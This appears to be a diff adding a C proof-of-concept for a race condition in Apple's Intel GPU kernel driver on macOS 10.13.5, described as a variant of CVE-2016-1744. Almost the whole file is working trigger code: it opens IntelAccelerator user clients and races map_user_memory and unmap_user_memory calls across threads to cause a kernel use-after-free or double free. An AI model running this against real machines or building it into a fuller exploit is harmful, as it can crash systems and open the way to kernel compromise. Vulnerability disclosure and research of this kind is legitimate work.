@@ -1,0 +1,245 @@
+/*
+This PoC file might look familiar; this bug is a trivial variant of CVE-2016-1744 (Apple bug id 635599405.)
+
+That report showed the bug in the unmap_user_memory external methods; a variant also exists
+in the map_user_memory external methods.
+
+The intel graphics drivers have their own hash table type IGHashTable which isn't thread-safe.
+
+map_user_memory manipulates an IGHashTable without locking leading to memory issues (eg UaFs and/or double-frees)
+
+tested on MacOS 10.13.5 (17F77) on MacBookPro10,1
+*/
+
+//ianbeer
+
+// build: clang -o ig_gl_unmap_racer ig_gl_unmap_racer.c -framework IOKit
+
+#if 0
+UaF/Double-delete due to bad locking in Apple Intel GPU driver
+
+This PoC file might look familiar; this bug is a trivial variant of CVE-2016-1744 (Apple bug id 635599405.)
+
+That report showed the bug in the unmap_user_memory external methods; a variant also exists
+in the map_user_memory external methods.
+
+The intel graphics drivers have their own hash table type IGHashTable which isn't thread-safe.
+
+map_user_memory manipulates an IGHashTable without locking leading to memory issues (eg UaFs and/or double-frees)
+
+tested on MacOS 10.13.5 (17F77) on MacBookPro10,1
+
+#endif
+
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+
+#include <libkern/OSAtomic.h>
+
+#include <mach/thread_act.h>
+
+#include <pthread.h>
+
+#include <IOKit/IOKitLib.h>
+
+
+struct mem_desc {
+  uint64_t ptr;
+  uint64_t size;
+};
+
+uint64_t map_user_memory(mach_port_t conn) {
+  kern_return_t err;
+  void* mem = malloc(0x20000);
+  // make sure that the address we pass is page-aligned:
+  mem = (void*) ((((uint64_t)mem)+0x1000)&~0xfff);
+  printf("trying to map user pointer: %p\n", mem);
+  
+  uint64_t inputScalar[16] = {0};  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096] = {0};
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16] = {0};
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096] = {0};
+  size_t outputStructCnt = 0;
+
+  inputScalarCnt = 0;
+  inputStructCnt = 0x10;
+
+  outputScalarCnt = 4096;
+  outputStructCnt = 16;
+
+  struct mem_desc* md = (struct mem_desc*)inputStruct;
+  md->ptr = (uint64_t)mem;
+  md->size = 0x1000;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x200, // IGAccelGLContext::map_user_memory
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+   //return 0;
+  } else{
+    printf("worked? outputScalarCnt = %d\n", outputScalarCnt);
+  }
+    
+  printf("outputScalarCnt = %d\n", outputScalarCnt);
+
+  md = (struct mem_desc*)outputStruct;
+  printf("0x%llx :: 0x%llx\n", md->ptr, md->size);
+
+  return (uint64_t)mem;
+}
+
+uint64_t unmap_user_memory(mach_port_t conn, uint64_t handle) {
+  kern_return_t err;
+  
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+
+  inputScalarCnt = 0;
+  inputStructCnt = 0x8;
+
+  outputScalarCnt = 4096;
+  outputStructCnt = 16;
+
+  *((uint64_t*)inputStruct) = handle;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x201, // IGAccelGLContext::unmap_user_memory
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+  } else{
+    printf("worked?\n");
+  }
+  
+  return 0;
+}
+
+mach_port_t get_user_client(char* name, int type) {
+  kern_return_t err;
+
+  CFMutableDictionaryRef matching = IOServiceMatching(name);
+  if(!matching){
+   printf("unable to create service matching dictionary\n");
+   return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+   printf("no matches\n");
+   return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+
+  if (service == IO_OBJECT_NULL){
+   printf("unable to find service\n");
+   return 0;
+  }
+  printf("got service: %x\n", service);
+
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), type, &conn);
+  if (err != KERN_SUCCESS){
+   printf("unable to get user client connection\n");
+   return 0;
+  }
+
+  printf("got userclient connection: %x\n", conn);
+
+  return conn;
+}
+
+volatile mach_port_t gl_context = MACH_PORT_NULL;
+
+#define N_HANDLES 40
+void go(void* arg){
+  while (1) {
+    uint64_t handles[N_HANDLES] = {0};
+    for (int i = 0; i < N_HANDLES; i++) {
+      handles[i] = map_user_memory(gl_context);
+    }
+    
+    for (int i = 0; i < N_HANDLES; i++) {
+      unmap_user_memory(gl_context, handles[i]);
+    }
+  }
+}
+
+
+
+
+
+int main(int argc, char** argv){
+  // get an IGAccelGLContext
+  gl_context = get_user_client("IntelAccelerator", 1);
+  printf("gl_context: %x\n", gl_context);
+  
+  // get a IGAccelSharedUserClient
+  mach_port_t shared = get_user_client("IntelAccelerator", 6);
+  printf("shared: %x\n", shared);
+
+  // connect the gl_context to the shared UC so we can actually use it:
+  kern_return_t err = IOConnectAddClient(gl_context, shared);
+  if (err != KERN_SUCCESS){
+   printf("IOConnectAddClient error: %x\n", err);
+   return 0;
+  }
+
+  printf("added client to the shared UC\n");
+
+#define N_THREADS 2
+  pthread_t threads[N_THREADS];
+
+  for (int i = 0; i < N_THREADS; i++) {
+    pthread_create(&threads[i], NULL, go, NULL);
+  }
+
+  pthread_join(threads[0], NULL);
+
+
+  return 0;
+
+
+}
